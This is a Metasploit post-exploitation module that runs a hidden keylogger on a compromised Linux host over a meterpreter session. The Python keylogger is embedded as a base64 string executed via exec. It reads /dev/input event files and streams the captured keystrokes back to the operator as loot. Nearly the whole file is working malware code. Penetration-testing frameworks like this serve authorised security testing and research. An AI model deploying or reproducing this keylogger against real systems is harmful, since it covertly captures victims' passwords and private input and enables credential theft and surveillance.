##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Linux::System

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Linux Keylogger',
      'Description'   => %q{
          Run a keylogger by reading the /dev/input/event* files.
          You should run this as a job.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Eliott Teissonniere' ],
      'Platform'      => [ 'linux' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run
    unless command_exists?("python")
      print_error("No python executable found.")
      return
    end
    print_good("python available")

    loot = store_loot("host.linux.keystrokes", "text/plain", session, "Keystrokes on #{sysinfo['Computer']} - #{Time.now.to_s}\n\n", "keystrokes.txt", "User keystrokes")
    print_good("Logfile is #{loot}")

    # Comes from `base64 external/source/linux/keylogger.py`
    keylogger_cmd = "python -c \"exec 'IyBNZXRhc3Bsb2l0IEZyYW1ld29yazoga2V5bG9nZ2VyIG1vZHVsZSBmb3IgTGludXggc3lzdGVtcwojIENyZWRpdHM6IEVsaW90dCBUZWlzc29ubmllcmUgLSBTdW1tZXIgT2YgQ29kZSAyMDE4CgojIE9uZSBsaW5lcmVkIGluIHBvc3QvbGludXgvZ2F0aGVyL2tleWxvZ2dlci5yYgoKaW1wb3J0IHN0cnVjdAppbXBvcnQgc3lzCgpmcm9tIG9zIGltcG9ydCBwb3BlbgoKIyBGaW5kIHRoZSByaWdodCBldmVudCBmaWxlCmluZmlsZV9wYXRoID0gIi9kZXYvaW5wdXQvIiArIHBvcGVuKCJncmVwIC1FICAnSGFuZGxlcnN8RVY9JyAvcHJvYy9idXMvaW5wdXQvZGV2aWNlcyB8IGdyZXAgLUIxICdFVj0xMjAwMTMnIHwgZ3JlcCAtRW8gJ2V2ZW50WzAtOV0rJyIpLnJlYWQoKVs6LTFdCgojIEVuZ2xpc2ggb25seSBBVE0sIGlmIHNvbWVvbmUgaGFzIGEgd2F5IHRvIHJldHJpZXZlIHRoZW0gd2l0aCBubyBwcml2aWxlZ2VzCiMgKGR1bXBrZXlzIGlzIG5vdCBhIHNvbHV0aW9uIHNhZGx5KSwgSSBhbSBpbnRlcmVzdGVkCmtleW1hcHMgPSBbCiAgICAiUkVTRVJWRUQiLAogICAgIkVTQyIsCiAgICAiMSIsCiAgICAiMiIsCiAgICAiMyIsCiAgICAiNCIsCiAgICAiNSIsCiAgICAiNiIsCiAgICAiNyIsCiAgICAiOCIsCiAgICAiOSIsCiAgICAiMCIsCiAgICAiTUlOVVMiLAogICAgIkVRVUFMIiwKICAgICJCQUNLU1BBQ0UiLAogICAgIlRBQiIsCiAgICAiUSIsCiAgICAiVyIsCiAgICAiRSIsCiAgICAiUiIsCiAgICAiVCIsCiAgICAiWSIsCiAgICAiVSIsCiAgICAiSSIsCiAgICAiTyIsCiAgICAiUCIsCiAgICAiTEVGVEJSQUNFIiwKICAgICJSSUdIVEJSQUNFIiwKICAgICJFTlRFUiIsCiAgICAiTEVGVENUUkwiLAogICAgIkEiLAogICAgIlMiLAogICAgIkQiLAogICAgIkYiLAogICAgIkciLAogICAgIkgiLAogICAgIkoiLAogICAgIksiLAogICAgIkwiLAogICAgIlNFTUlDT0xPTiIsCiAgICAiQVBPU1RST1BIRSIsCiAgICAiR1JBVkUiLAogICAgIkxFRlRTSElGVCIsCiAgICAiQkFDS1NMQVNIIiwKICAgICJaIiwKICAgICJYIiwKICAgICJDIiwKICAgICJWIiwKICAgICJCIiwKICAgICJOIiwKICAgICJNIiwKICAgICJDT01NQSIsCiAgICAiRE9UIiwKICAgICJTTEFTSCIsCiAgICAiUklHSFRTSElGVCIsCiAgICAiS1BBU1RFUklTSyIsCiAgICAiTEVGVEFMVCIsCiAgICAiU1BBQ0UiLAogICAgIkNBUFNMT0NLIiwKICAgICJGMSIsCiAgICAiRjIiLAogICAgIkYzIiwKICAgICJGNCIsCiAgICAiRjUiLAogICAgIkY2IiwKICAgICJGNyIsCiAgICAiRjgiLAogICAgIkY5IiwKICAgICJGMTAiLAogICAgIk5VTUxPQ0siLAogICAgIlNDUk9MTExPQ0siCl0KCiMgSnVzdCBmb3Igc29tZSBwcmV0dHkgcHJpbnRpbmcgcHVycG9zZXMKc2hpZnQgPSBGYWxzZQptb2RpZmllcnMgPSBbCiAgICAiTEVGVFNISUZUIiwKICAgICJSSUdIVFNISUZUIiwKICAgICJMRUZUQ1RSTCIsCiAgICAiTEVGVEFMVCIKXQpwcmVzc2VkID0gW10KCiNsb25nIGludCwgbG9uZyBpbnQsIHVuc2lnbmVkIHNob3J0LCB1bnNpZ25lZCBzaG9ydCwgdW5zaWduZWQgaW50CkZPUk1BVCA9ICdsbEhISScKRVZFTlRfU0laRSA9IHN0cnVjdC5jYWxjc2l6ZShGT1JNQVQpCgojb3BlbiBmaWxlIGluIGJpbmFyeSBtb2RlCmluX2ZpbGUgPSBvcGVuKGluZmlsZV9wYXRoLCAicmIiKQoKd2hpbGUgMToKICAgIGV2ZW50ID0gaW5fZmlsZS5yZWFkKEVWRU5UX1NJWkUpCiAgICAKICAgICh0dl9zZWMsIHR2X3VzZWMsIHR5cGUsIGNvZGUsIHZhbHVlKSA9IHN0cnVjdC51bnBhY2soRk9STUFULCBldmVudCkKCiAgICBpZiAodHlwZSA9PSAxKSBhbmQgKHZhbHVlID09IDEgb3IgdmFsdWUgPT0gMCkgOgogICAgICAgIGtleSA9ICJ1bmtub3duICglZCkiICUgY29kZQogICAgICAgIGlmIGNvZGUgPCBsZW4oa2V5bWFwcykgYW5kIGtleSA+PSAwOgogICAgICAgICAgICBrZXkgPSBrZXltYXBzW2NvZGVdCgogICAgICAgIGlmIGxlbihrZXkpID09IDEgYW5kIHZhbHVlID09IDE6CiAgICAgICAgICAgIGlmIG5vdCBzaGlmdDoga2V5ID0ga2V5Lmxvd2VyKCkKCiAgICAgICAgICAgIHRvX3ByaW50ID0gIiIKICAgICAgICAgICAgZm9yIG1vZGlmaWVyIGluIHByZXNzZWQ6CiAgICAgICAgICAgICAgICB0b19wcmludCArPSBtb2RpZmllciArICIgIgogICAgICAgICAgICBwcmludCh0b19wcmludCArIGtleSkKICAgICAgICBlbGlmIGtleSBpbiBtb2RpZmllcnM6CiAgICAgICAgICAgIGlmIHZhbHVlID09IDA6CiAgICAgICAgICAgICAgICBpZiBrZXkgPT0gIlJJR0hUU0hJRlQiIG9yIGtleSA9PSAiTEVGVFNISUZUIjoKICAgICAgICAgICAgICAgICAgICBzaGlmdCA9IEZhbHNlCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByZXNzZWQucmVtb3ZlKGtleSkKICAgICAgICAgICAgZWxpZiB2YWx1ZSA9PSAxOgogICAgICAgICAgICAgICAgaWYga2V5ID09ICJSSUdIVFNISUZUIiBvciBrZXkgPT0gIkxFRlRTSElGVCI6CiAgICAgICAgICAgICAgICAgICAgc2hpZnQgPSBUcnVlCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByZXNzZWQuYXBwZW5kKGtleSkKICAgICAgICBlbGlmIHZhbHVlID09IDAgYW5kIGtleSBub3QgaW4gbW9kaWZpZXJzIGFuZCBsZW4oa2V5KSA+IDE6CiAgICAgICAgICAgIHByaW50KGtleSkKCiAgICAjIE1ha2VzIHN1cmUgbWV0dGxlIHJlYWRzIG91ciBvdXRwdXQKICAgIHN5cy5zdGRvdXQuZmx1c2goKQoKaW5fZmlsZS5jbG9zZSgpCg=='.decode('base64')\""
    
    # We have to reimplement cmd-exec in order to stream
    # the output
    print_status("Starting keylogger")

    session.response_timeout = 15
    process = session.sys.process.execute(keylogger_cmd, "", { "Hidden" => true, "Channelized" => true })

    print_good("Process started")

    while (d = process.channel.read)
      if d == ""
          sleep 0.1 # No timeout, just wait
      else
        # We have something!
        file_local_write(loot, d)
      end
    end

    # Normally we don't reach that part unless
    # the process is killed on the victim side

    begin
      process.channel.close
    rescue IOError => e
      # Nothing to do
    end

    process.close

    print_error("End of process, keylogger may have been killed")
  end
end
